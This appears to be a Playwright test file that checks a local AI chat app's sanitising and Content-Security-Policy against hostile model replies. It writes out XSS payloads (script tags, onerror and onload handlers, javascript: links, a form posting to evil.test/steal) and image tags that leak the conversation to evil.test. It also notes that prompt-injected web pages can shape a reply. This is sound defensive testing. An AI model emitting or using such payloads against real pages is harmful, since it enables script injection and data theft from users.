import type { Page } from '@playwright/test'
import { expect, test } from '@playwright/test'
import { mockBackend } from './support/mockBackend'
import { settle } from './support/screenshot'

// Model output is untrusted and is rendered as HTML after markdown (the only
// place the app does that is MessageParts, through DOMPurify). A reply — or a
// web page the model read and was prompt-injected by — must not be able to run
// script on the page that holds the user's chats and can start Docker
// containers. This needs a real browser: DOMPurify declines to sanitise in the
// fake DOM the component tests run in.
const HOSTILE_MARKDOWN = [
  'Before the attack.',
  '<script>window.__pwned = "script"</script>',
  '<img src="x" onerror="window.__pwned = \'img onerror\'">',
  '[markdown link](javascript:window.__pwned=\'md link\')',
  '<a href="javascript:window.__pwned=\'html link\'" onclick="window.__pwned = \'onclick\'">html link</a>',
  '<iframe src="https://evil.test/"></iframe>',
  '<object data="https://evil.test/x"></object><embed src="https://evil.test/x">',
  '<svg onload="window.__pwned = \'svg\'"><script>window.__pwned = \'svg script\'</script></svg>',
  '<details open ontoggle="window.__pwned = \'toggle\'">toggle</details>',
  '<form action="https://evil.test/steal"><input name="x"><button>Send</button></form>',
  '<style>body { display: none !important }</style>',
  '<div style="position: fixed; inset: 0; background: red">fake overlay</div>',
  'After the attack, **bold survives**.',
].join('\n\n')

const hostileHistory = [
  { role: 'user', content: 'show me something', image: '', thinking: '', model: '', sibling_count: 1, sibling_index: 0 },
  { role: 'assistant', content: HOSTILE_MARKDOWN, image: '', thinking: '', model: 'deepseek-r1:1.5b', sibling_count: 1, sibling_index: 0 },
]

function inspectRenderedReply(page: Page) {
  return page.evaluate(() => {
    const body = document.querySelector('.markdown-body')!
    const everything = [...body.querySelectorAll('*')]

    return {
      banned: body.querySelectorAll('script, iframe, object, embed, style, form, button, textarea, select').length,
      styled: body.querySelectorAll('[style]').length,
      eventHandlers: everything.flatMap(el => [...el.attributes].filter(a => a.name.startsWith('on')).map(a => `${el.tagName}.${a.name}`)),
      scriptLinks: [...body.querySelectorAll('a')].map(a => a.getAttribute('href') ?? '').filter(h => /^\s*javascript:/i.test(h)),
      pwned: (window as unknown as { __pwned?: string }).__pwned ?? null,
      pageStillVisible: getComputedStyle(document.body).display !== 'none',
      text: body.textContent ?? '',
    }
  })
}

test('a hostile reply from history cannot run script or inject active content', async ({ page }) => {
  const dialogs: string[] = []
  page.on('dialog', (dialog) => {
    dialogs.push(dialog.message())
    void dialog.dismiss()
  })
  await mockBackend(page, { chatHistory: hostileHistory })

  await page.goto('/chat')
  await expect(page.getByText('After the attack')).toBeVisible()
  await settle(page)

  const result = await inspectRenderedReply(page)

  expect(result.banned).toBe(0)
  expect(result.styled).toBe(0)
  expect(result.eventHandlers).toEqual([])
  expect(result.scriptLinks).toEqual([])
  expect(result.pwned).toBeNull()
  expect(result.pageStillVisible).toBe(true)
  expect(dialogs).toEqual([])
  // The sanitiser removes the danger, not the reply: ordinary content stays.
  expect(result.text).toContain('Before the attack.')
  expect(result.text).toContain('bold survives')
})

test('a hostile reply streaming in is sanitised too', async ({ page }) => {
  const backend = await mockBackend(page, { chatHistory: [] })

  await page.goto('/chat')
  await backend.chatConnected
  backend.pushChatFrame({ message: HOSTILE_MARKDOWN, done: false })
  await expect(page.getByText('After the attack')).toBeVisible()
  await settle(page)

  const result = await inspectRenderedReply(page)

  expect(result.banned).toBe(0)
  expect(result.eventHandlers).toEqual([])
  expect(result.scriptLinks).toEqual([])
  expect(result.pwned).toBeNull()
})

test('a hostile "thinking" block is shown as text, not run', async ({ page }) => {
  const backend = await mockBackend(page, { chatHistory: [] })

  await page.goto('/chat')
  await backend.chatConnected
  backend.pushChatFrame({ message: '', done: false, thinking: '<img src=x onerror="window.__pwned = \'thinking\'"><script>window.__pwned = \'thinking\'</script>' })
  backend.pushChatFrame({ message: 'visible answer', done: false })
  await expect(page.getByText('visible answer')).toBeVisible()
  await settle(page)

  const pwned = await page.evaluate(() => (window as unknown as { __pwned?: string }).__pwned ?? null)
  const injected = await page.evaluate(() => document.querySelectorAll('.messages-list script, .messages-list img[onerror]').length)

  expect(pwned).toBeNull()
  expect(injected).toBe(0)
})

test('a reply cannot make the browser contact another site, so it cannot leak the chat in a URL', async ({ page }) => {
  const contacted: string[] = []
  await page.route('https://evil.test/**', (route) => {
    contacted.push(route.request().url())

    return route.fulfill({ status: 200, contentType: 'image/png', body: '' })
  })
  const backend = await mockBackend(page, {
    chatHistory: [
      { role: 'user', content: 'summarise', image: '', thinking: '', model: '', sibling_count: 1, sibling_index: 0 },
      {
        role: 'assistant',
        content: [
          'Here you go.',
          '<img src="https://evil.test/pixel.png?stolen=the+whole+conversation">',
          '![markdown image](https://evil.test/md.png?stolen=the+whole+conversation)',
          'Done.',
        ].join('\n\n'),
        image: '',
        thinking: '',
        model: 'deepseek-r1:1.5b',
        sibling_count: 1,
        sibling_index: 0,
      },
    ],
  })

  await page.goto('/chat')
  await expect(page.getByText('Done.')).toBeVisible()
  await settle(page)

  expect(contacted).toEqual([])
  // The page's own policy is what stopped it: the sanitiser lets <img> through.
  expect(backend.cspViolations.some(v => v.includes('img-src'))).toBe(true)
})

test('the page is served with a Content-Security-Policy that keeps images and sockets local', async ({ page }) => {
  await mockBackend(page)

  const response = await page.goto('/')
  const policy = response?.headers()['content-security-policy'] ?? ''

  expect(policy).toContain('img-src \'self\' data:')
  expect(policy).toContain('object-src \'none\'')
  expect(policy).toContain('frame-ancestors \'none\'')
  expect(policy).toMatch(/connect-src 'self' http:\/\/localhost:8000 ws:\/\/localhost:8000/)
})

test('a user can still attach and see their own image under the policy', async ({ page }) => {
  const oneByOnePng = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='
  const backend = await mockBackend(page, {
    chatHistory: [{ role: 'user', content: 'what is this?', image: oneByOnePng, thinking: '', model: '', sibling_count: 1, sibling_index: 0 }],
  })

  await page.goto('/chat')
  await expect(page.getByText('what is this?')).toBeVisible()
  await settle(page)

  const loaded = await page.evaluate(() => {
    const img = document.querySelector<HTMLImageElement>('.user-bubble img, img[alt*="pload"]')

    return img
      ? img.complete && img.naturalWidth > 0
      : null
  })
  expect(loaded).toBe(true)
  expect(backend.cspViolations).toEqual([])
})
